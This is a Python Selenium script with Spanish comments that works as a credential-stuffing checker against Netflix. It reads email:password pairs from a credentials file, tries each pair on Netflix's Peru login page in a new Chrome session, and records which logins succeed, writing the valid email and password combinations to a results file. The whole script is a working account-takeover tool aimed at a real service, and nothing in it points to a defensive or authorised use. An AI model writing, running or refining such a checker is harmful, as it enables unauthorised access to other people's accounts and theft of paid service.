from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# URL de la página web
url_pagina_web = "https://www.netflix.com/pe/login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse"

# Ruta del archivo que contiene correos y contraseñas
ruta_archivo_credenciales = "CREDENCIALES_ORDENADAS.txt"
# Ruta del archivo de resultados
ruta_archivo_resultados = "resultados.txt"

# Configuración del navegador (puedes cambiar el navegador si lo deseas)

# Abrir el archivo de resultados en modo escritura con la codificación utf-8
with open(ruta_archivo_resultados, "w", encoding="utf-8") as archivo_resultados:
    # Leer el contenido del archivo de credenciales
    with open(ruta_archivo_credenciales, "r") as archivo_credenciales:
        lineas = archivo_credenciales.readlines()

    # Iterar sobre las líneas del archivo
    for linea in lineas:
        # Dividir la línea en correo y contraseña
        correo, contrasena = linea.strip().split(":")

        # Configuración del navegador para cada cuenta
        driver = Chrome()

        try:
            # Abrir la página web
            driver.get(url_pagina_web)

            # Esperar hasta que el campo de correo esté presente en la página
            elemento_correo = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "id_userLoginId"))
            )

            # Limpiar el campo de correo
            elemento_correo.clear()

            # Escribir el correo en el campo de correo electrónico
            elemento_correo.send_keys(correo)

            # Encontrar el elemento de contraseña
            elemento_contrasena = driver.find_element(By.ID, "id_password")

            # Limpiar el campo de contraseña
            elemento_contrasena.clear()

            # Escribir la contraseña en el campo de contraseña
            elemento_contrasena.send_keys(contrasena)

            # Puedes enviar el formulario presionando la tecla Enter
            elemento_contrasena.send_keys(Keys.ENTER)

            # Esperar unos segundos antes de pasar al siguiente conjunto de credenciales
            time.sleep(5)

            # Verificar si se ha iniciado sesión (verificando la presencia del mensaje de error)
            try:
                mensaje_error = driver.find_element(By.CSS_SELECTOR, 'div[data-uia="text"]').text
                resultado = f"Fallo: {mensaje_error} para la cuenta: {correo} - Contraseña: {contrasena}\n"
            except:
                # Si no se encuentra el mensaje de error, asumimos que se ha iniciado sesión correctamente
                resultado = f"Éxito: Se ha iniciado sesión correctamente para la cuenta: {correo} - Contraseña: {contrasena}\n"

            # Imprimir el resultado en la terminal
            print(resultado)

            # Escribir el resultado en el archivo de resultados
            archivo_resultados.write(resultado)

        except Exception as e:
            # Omitir mensajes de error en el archivo de resultados
            pass

        finally:
            # Cerrar el navegador al finalizar la prueba para esta cuenta
            driver.quit()

# Importante: Deberías cerrar el navegador manualmente cuando hayas terminado todas las pruebas.
